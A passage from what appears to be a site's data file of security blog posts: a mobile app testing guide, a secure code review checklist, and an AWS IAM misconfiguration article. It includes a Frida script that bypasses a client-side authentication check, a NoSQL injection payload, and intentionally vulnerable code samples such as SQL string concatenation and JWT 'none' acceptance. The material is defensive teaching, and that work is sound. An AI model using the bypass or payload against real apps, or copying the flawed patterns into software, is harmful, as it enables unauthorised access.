### iOS IPA Analysis

\`\`\`bash
# Extract IPA
unzip app.ipa -d app_extracted

# Check for hardcoded strings
strings app_extracted/Payload/App.app/App | grep -i "key\\|secret\\|password"

# Check Info.plist for sensitive configs
plutil -p app_extracted/Payload/App.app/Info.plist
\`\`\`

---

## Testing Area #4: Insecure API Communication

\`\`\`bash
# Intercept traffic with mitmproxy
mitmproxy --mode transparent --listen-port 8080

# Check for:
# - Sensitive data sent over HTTP (not HTTPS)
# - Tokens in URL query parameters (logged by proxies)
# - Missing authentication on sensitive endpoints
# - Excessive data in API responses
\`\`\`

---

## Testing Area #5: Authentication Flaws

### Common Mobile Auth Vulnerabilities

1. **Biometric bypass** — Fallback to weak PIN
2. **Token stored insecurely** — Plain text in SharedPreferences
3. **No session expiration** — Tokens valid for months
4. **Missing re-authentication** — Sensitive actions without password confirmation
5. **Client-side auth checks** — Easily bypassed with Frida

\`\`\`javascript
// Frida — Bypass client-side auth check
Java.perform(function () {
  var AuthManager = Java.use('com.example.app.AuthManager');
  AuthManager.isAuthenticated.implementation = function () {
    console.log('Bypassed isAuthenticated');
    return true;  // Always return authenticated
  };
});
\`\`\`

---

## Free Tools for Mobile Security Testing

| Tool | Platform | Purpose |
|---|---|---|
| MobSF | Both | Automated static/dynamic analysis |
| Frida | Both | Runtime instrumentation |
| Objection | Both | Runtime exploration |
| Jadx | Android | APK decompilation |
| apktool | Android | APK resource extraction |
| Hopper | iOS | Binary analysis |
| mitmproxy | Both | Traffic interception |
| Drozer | Android | IPC / exported component testing |

---

## Mobile Security Testing Checklist

| # | Test | Priority |
|---|---|---|
| 1 | Check for insecure data storage | Critical |
| 2 | Test certificate pinning | High |
| 3 | Search for hardcoded secrets | Critical |
| 4 | Intercept API traffic | High |
| 5 | Test authentication bypass | Critical |
| 6 | Check binary protections (obfuscation) | Medium |
| 7 | Test exported components (Android) | High |
| 8 | Check for debug/logging in release builds | Medium |
| 9 | Verify clipboard data handling | Medium |
| 10 | Test deep link/URL scheme handling | High |

---

## Need a Mobile App Security Audit?

We do hands-on security testing for Android and iOS applications. [Request a free consultation →](/contact?subject=Free+Sample+Code+Review)

---

*Published by the SecureCodeReviews.com team — mobile application security specialists.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-01-18",
    tags: ["Mobile Security", "Android", "iOS", "OWASP Mobile Top 10"],
    category: "Mobile Security",
    readTime: "17 min read",
  },
  {
    slug: "secure-code-review-checklist-2025",
    title: "The Ultimate Secure Code Review Checklist for 2025",
    excerpt:
      "A comprehensive, language-agnostic checklist for secure code reviews. Use this as your team's standard for catching vulnerabilities before they reach production.",
    content: `## Why You Need a Secure Code Review Checklist

Code reviews catch bugs. **Secure** code reviews catch vulnerabilities. The difference? A structured approach that ensures security-critical patterns are **never overlooked**.

> **Stat:** Organizations with formal secure code review processes have **65% fewer vulnerabilities** in production (Veracode State of Software Security 2024).

This checklist is what we use internally at SecureCodeReviews.com for client engagements. We're sharing it publicly to help raise the bar for application security.

---

## 1. Authentication & Session Management

### Questions to Ask During Review

- [ ] Are passwords hashed with bcrypt/scrypt/Argon2 (not MD5/SHA1)?
- [ ] Is there rate limiting on login attempts?
- [ ] Are sessions invalidated on logout/password change?
- [ ] Do session tokens have appropriate expiration?
- [ ] Is multi-factor authentication available for sensitive operations?
- [ ] Are password reset tokens single-use and time-limited?

### Red Flags

\`\`\`javascript
// ❌ MD5 for password hashing
const hash = crypto.createHash('md5').update(password).digest('hex');

// ❌ No rate limiting on auth endpoints
app.post('/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  // ... unlimited attempts allowed
});

// ❌ JWT with 'none' algorithm accepted
const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });
\`\`\`

### Correct Patterns

\`\`\`javascript
// ✅ Argon2 for password hashing
import argon2 from 'argon2';
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,
  timeCost: 3,
  parallelism: 4,
});

// ✅ Rate limited auth
import rateLimit from 'express-rate-limit';
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts',
});
app.post('/login', loginLimiter, authController.login);
\`\`\`

---

## 2. Authorization & Access Control

- [ ] Is authorization checked on **every** request (not just UI)?
- [ ] Are direct object references (IDs) validated against the authenticated user?
- [ ] Is there horizontal privilege escalation protection?
- [ ] Are admin endpoints protected by role checks?
- [ ] Does the API validate ownership before update/delete operations?

### Red Flags

\`\`\`javascript
// ❌ IDOR — user ID from request, not session
app.get('/api/user/:id/profile', (req, res) => {
  const profile = await User.findById(req.params.id);
  res.json(profile);
});

// ❌ Role check only on frontend
if (user.role === 'admin') {
  showAdminPanel();  // Backend doesn't verify!
}
\`\`\`

### Correct Patterns

\`\`\`javascript
// ✅ Verify ownership
app.get('/api/user/:id/profile', authenticate, (req, res) => {
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const profile = await User.findById(req.params.id);
  res.json(profile);
});
\`\`\`

---

## 3. Input Validation & Output Encoding

- [ ] Is all user input validated (type, length, range, format)?
- [ ] Is output properly encoded for context (HTML, JS, URL, CSS)?
- [ ] Are file uploads validated (type, size, content)?
- [ ] Are SQL queries parameterized (no string concatenation)?
- [ ] Is there protection against NoSQL injection?
- [ ] Are regex patterns safe from ReDoS?

### Red Flags

\`\`\`javascript
// ❌ String concatenation in SQL
db.query(\`SELECT * FROM users WHERE email = '\${req.body.email}'\`);

// ❌ NoSQL injection
User.findOne({ email: req.body.email, password: req.body.password });
// Attacker sends: { "password": { "$ne": "" } }

// ❌ Unvalidated file upload
app.post('/upload', upload.single('file'), (req, res) => {
  // No type/size validation — could upload .exe, 10GB file, etc.
});

// ❌ Dangerous regex (ReDoS)
const emailRegex = /^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$/;
\`\`\`

---

## 4. Cryptography

- [ ] Are cryptographic keys properly managed (not hardcoded)?
- [ ] Is TLS 1.2+ enforced for all connections?
- [ ] Are weak algorithms avoided (MD5, SHA1 for security, DES, RC4)?
- [ ] Is sensitive data encrypted at rest?
- [ ] Are random values generated with cryptographic PRNGs?

### Red Flags

\`\`\`javascript
// ❌ Hardcoded encryption key
const key = 'my-secret-key-12345';
const encrypted = crypto.createCipher('aes-128-cbc', key).update(data);

// ❌ Math.random for security-sensitive values
const resetToken = Math.random().toString(36).substring(2);

// ✅ Correct
const resetToken = crypto.randomBytes(32).toString('hex');
\`\`\`

---

## 5. Error Handling & Logging

- [ ] Do error messages avoid exposing internal details (stack traces, SQL queries)?
- [ ] Are security events logged (failed logins, auth failures, privilege changes)?
- [ ] Do logs avoid recording sensitive data (passwords, tokens, PII)?
- [ ] Is there monitoring/alerting for security anomalies?

### Red Flags

\`\`\`javascript
// ❌ Exposing internal errors to users
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,        // Never expose stack traces!
    query: err.sql,          // Never expose SQL queries!
  });
});

// ❌ Logging sensitive data
console.log('Login attempt:', { email, password });  // Passwords in logs!
console.log('API call with token:', req.headers.authorization);
\`\`\`

---

## 6. API Security

- [ ] Are all endpoints authenticated (unless intentionally public)?
- [ ] Is there rate limiting on sensitive endpoints?
- [ ] Are API responses filtered to return only necessary data?
- [ ] Is CORS configured restrictively (not \`*\`)?
- [ ] Are webhooks verified (signature validation)?
- [ ] Is GraphQL introspection disabled in production?

---

## 7. Dependency & Supply Chain Security

- [ ] Are dependencies up to date (no known CVEs)?
- [ ] Is there a lock file committed (package-lock.json, yarn.lock)?
- [ ] Are \`postinstall\` scripts reviewed for new dependencies?
- [ ] Is Dependabot or Renovate configured?
- [ ] Are dependencies from trusted sources only?

\`\`\`bash
# Quick dependency audit
npm audit --audit-level=high
pip-audit
bundle audit check
\`\`\`

---

## 8. Infrastructure & Configuration

- [ ] Are secrets stored in environment variables or secret managers (not code)?
- [ ] Is debug mode disabled in production?
- [ ] Are security headers set (CSP, HSTS, X-Frame-Options)?
- [ ] Are default credentials changed?
- [ ] Is HTTPS enforced (HTTP→HTTPS redirect)?

---

## How to Use This Checklist

1. **Before each PR review:** Scan through relevant sections
2. **Quarterly:** Audit the full codebase against all sections
3. **New features:** Focus on Authentication, Authorization, and Input Validation
4. **Third-party integrations:** Focus on API Security and Dependency sections

### Severity Classification

| Severity | Definition | Examples |
|---|---|---|
| Critical | Exploitable with no special access | SQLi, RCE, Auth bypass |
| High | Exploitable with low-privilege access | IDOR, Stored XSS, SSRF |
| Medium | Requires specific conditions | CSRF, Open redirect |
| Low | Information disclosure, best practices | Verbose errors, missing headers |

---

## Want a Professional Review Using This Checklist?

Our team uses this checklist (and much more) during every client engagement. [Request a free 20-line code review →](/contact?subject=Free+Sample+Code+Review)

---

*Published by SecureCodeReviews.com — the checklist we wish every dev team would adopt.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-02-01",
    tags: ["Secure Code Review", "Checklist", "Best Practices", "AppSec"],
    category: "Application Security",
    readTime: "12 min read",
  },
  {
    slug: "aws-iam-security-mistakes-developers-make",
    title: "7 AWS IAM Security Mistakes Every Developer Makes",
    excerpt:
      "IAM is the foundation of AWS security — and the most misconfigured service. Here are the 7 mistakes we find in every AWS security audit, with Terraform and CLI fixes.",
    content: `## AWS IAM: The Most Important (and Most Misconfigured) Service

If your AWS IAM is misconfigured, **nothing else matters**. Not your WAF, not your VPC, not your encryption. An overprivileged IAM role is the master key to your entire cloud environment.

> **Fact:** According to Datadog's 2024 State of Cloud Security report, **45% of organizations** have at least one IAM user with long-lived credentials that haven't been rotated in over 90 days.

---

## Mistake #1: Using Root Account for Daily Tasks

The AWS root account has **unrestricted access** to every service and resource. It cannot be limited by IAM policies.

### ❌ Common Anti-Pattern

\`\`\`
Developer: "I just use the root account, it's easier."
Result: One compromised credential = total account takeover
\`\`\`

### ✅ Fix

\`\`\`bash
# 1. Enable MFA on root account
aws iam enable-mfa-device --user-name root \\
  --serial-number arn:aws:iam::mfa/root-account-mfa-device \\
  --authentication-code1 123456 --authentication-code2 789012

# 2. Create admin user with limited permissions
aws iam create-user --user-name admin-user
aws iam attach-user-policy --user-name admin-user \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. Store root credentials in a safe, use only for:
#    - Closing account
#    - Changing root email
#    - Enabling MFA
#    - Restoring IAM permissions
\`\`\`

---

## Mistake #2: Wildcard Permissions (\`*\`)

### ❌ The "Just Make It Work" Policy

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
\`\`\`

This grants **every possible permission** — S3, EC2, IAM, Lambda, billing, everything.

### ✅ Fix: Least-Privilege Policy

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:GetObject",
      "s3:PutObject"
    ],
    "Resource": "arn:aws:s3:::my-app-bucket/*"
  }, {
    "Effect": "Allow",
    "Action": [
      "dynamodb:GetItem",
      "dynamodb:PutItem",
      "dynamodb:Query"
    ],
    "Resource": "arn:aws:dynamodb:us-east-1:*:table/my-app-table"
  }]
}
\`\`\`

### Generate Least-Privilege Policies

\`\`\`bash
# Use IAM Access Analyzer to generate policy from actual usage
aws accessanalyzer start-policy-generation \\
  --policy-generation-details '{"principalArn":"arn:aws:iam::role/my-role"}'

# Or use iamlive to capture needed permissions
iamlive --mode proxy --force-wildcard-resource
# ... run your application ...
# iamlive outputs the minimum required policy
\`\`\`

---

## Mistake #3: Long-Lived Access Keys

### ❌ Keys That Never Expire

\`\`\`bash
# Check for old access keys
aws iam list-access-keys --user-name developer
# Created: 2022-03-15 — over 2 years old!
\`\`\`

### ✅ Fix: Use IAM Roles + Temporary Credentials

\`\`\`hcl
# Terraform — EC2 instance with IAM role (no access keys needed)
resource "aws_iam_role" "app_role" {
  name = "app-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "ec2.amazonaws.com"
      }
    }]
  })
}

resource "aws_iam_instance_profile" "app_profile" {
  name = "app-profile"
  role = aws_iam_role.app_role.name
}

resource "aws_instance" "app" {
  ami                  = "ami-12345678"
  instance_type        = "t3.micro"
  iam_instance_profile = aws_iam_instance_profile.app_profile.name
  # No access keys needed — uses instance metadata for credentials
}
\`\`\`

\`\`\`bash
# For CI/CD — use OIDC instead of access keys
# GitHub Actions example (no static credentials)
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::role/github-actions-role
    aws-region: us-east-1
\`\`\`

---

## Mistake #4: Not Using Permission Boundaries

Without boundaries, anyone with \`iam:CreateRole\` can create an admin role.

### ✅ Fix: Set Permission Boundaries

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:*",
      "dynamodb:*",
      "lambda:*",
      "logs:*"
    ],
    "Resource": "*"
  }, {
    "Sid": "DenyIAMChanges",
    "Effect": "Deny",
    "Action": [
      "iam:CreateUser",
      "iam:CreateRole",
      "iam:AttachRolePolicy",
      "iam:PutRolePolicy",
      "organizations:*"
    ],
    "Resource": "*"
  }]
}
\`\`\`

---

## Mistake #5: Cross-Account Trust Too Broad

### ❌ Trusting an Entire Account

\`\`\`json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::123456789012:root"
    },
    "Action": "sts:AssumeRole"
  }]
}
\`\`\`

Any role in account 123456789012 can assume this role — including compromised roles.

### ✅ Fix: Trust Specific Roles

\`\`\`json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::123456789012:role/specific-deploy-role"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "unique-external-id-12345"
      }
    }
  }]
}
\`\`\`

---

## Mistake #6: No SCPs (Service Control Policies)

SCPs provide guardrails at the organization level. Without them, any account can do anything.

### ✅ Fix: Key SCPs Every Org Needs

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyDisablingCloudTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail"
      ],
      "Resource": "*"
    },
    {
      "Sid": "DenyLeavingOrg",
      "Effect": "Deny",
      "Action": "organizations:LeaveOrganization",
      "Resource": "*"
    },
    {
      "Sid": "RequireIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    }
  ]
}
\`\`\`

---

## Mistake #7: No CloudTrail Monitoring for IAM Events

### ✅ Fix: Monitor Critical IAM Events

\`\`\`bash
# CloudWatch alarm for root account usage
aws cloudwatch put-metric-alarm \\
  --alarm-name "RootAccountUsage" \\
  --metric-name "RootAccountUsageCount" \\
  --namespace "CloudTrailMetrics" \\
  --comparison-operator GreaterThanOrEqualToThreshold \\
  --evaluation-periods 1 \\
  --period 300 \\
  --threshold 1 \\
  --statistic Sum \\
  --alarm-actions arn:aws:sns:us-east-1:*:security-alerts
\`\`\`

### Key IAM Events to Monitor

| Event | Why |
|---|---|
| ConsoleLogin (root) | Root should never be used |
| CreateAccessKey | Static credentials being created |
| AttachUserPolicy / AttachRolePolicy | Privilege escalation |
| CreateUser / CreateRole | New principals |
| PutBucketPolicy | S3 access changes |
| AuthorizeSecurityGroupIngress | Network access changes |

---

## IAM Security Audit Script

\`\`\`bash
#!/bin/bash
echo "=== AWS IAM Security Quick Audit ==="

echo "\\n--- Users with console access ---"
aws iam list-users --query 'Users[*].UserName' --output table

echo "\\n--- Users with access keys ---"
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  keys=$(aws iam list-access-keys --user-name $user --query 'AccessKeyMetadata[*].[Status,CreateDate]' --output text)
  if [ -n "$keys" ]; then
    echo "$user: $keys"
  fi
done

echo "\\n--- Policies with admin access ---"
aws iam list-policies --only-attached --query 'Policies[?PolicyName==\`AdministratorAccess\`]'

echo "\\n--- MFA status ---"
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  mfa=$(aws iam list-mfa-devices --user-name $user --query 'MFADevices' --output text)
  if [ -z "$mfa" ]; then
    echo "NO MFA: $user"
  fi
done
\`\`\`

---

## Need an AWS Security Audit?

We review IAM policies, VPC configurations, S3 bucket policies, and CloudTrail setups. [Request a free consultation →](/contact?subject=Free+Sample+Code+Review)

---

*Published by SecureCodeReviews.com — helping teams lock down their AWS infrastructure.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-01-15",
    tags: ["AWS", "IAM", "Cloud Security", "Terraform"],
    category: "Cloud Security",
    readTime: "15 min read",
  },
];
